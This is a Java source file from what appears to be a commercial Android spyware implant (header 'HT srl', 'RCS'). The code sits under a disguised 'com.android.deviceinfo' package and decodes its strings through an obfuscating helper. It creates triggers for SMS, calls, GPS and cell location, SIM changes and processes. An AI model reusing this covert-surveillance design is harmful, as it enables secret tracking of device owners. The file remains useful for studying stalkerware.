/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.event;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.AbstractFactory;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class FactoryEvent implements AbstractFactory<BaseEvent, String> {
	private static final String TAG = "EventFactory"; //$NON-NLS-1$

	public BaseEvent create(String type, String subtype) {
		BaseEvent e = new NullEvent();
		
		if (M.d("timer").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			if (M.d("loop").equals(subtype)) { //$NON-NLS-1$
				e = new EventLoop();
			} else {
				e = new EventTimer();
			}
		} else if (M.d("date").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventDate();
		} else if (M.d("afterinst").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventAfterinst();
		} else if (M.d("sms").equals(type)) { //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SMS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventSms();
		} else if (M.d("call").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventCall();
		} else if (M.d("connection").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CONNECTION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventConnectivity();
		} else if (M.d("process").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_PROCESS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventProcess();
		} else if (M.d("position cell").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CELLID");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventCellId();
		} else if (M.d("quota").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_QUOTA");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventQuota();
		} else if (M.d("sim").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SIM_CHANGE");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventSim();
		} else if (M.d("position gps").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_LOCATION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventLocation();
		} else if (M.d("ac").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_AC");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventAc();
		} else if (M.d("battery").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_BATTERY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventBattery();
		} else if (M.d("standby").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_STANDBY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventStandby();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "Unknown: " + type);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		if (e != null) {
			e.setSubType(subtype);
		}
		
		return e;
	}

}
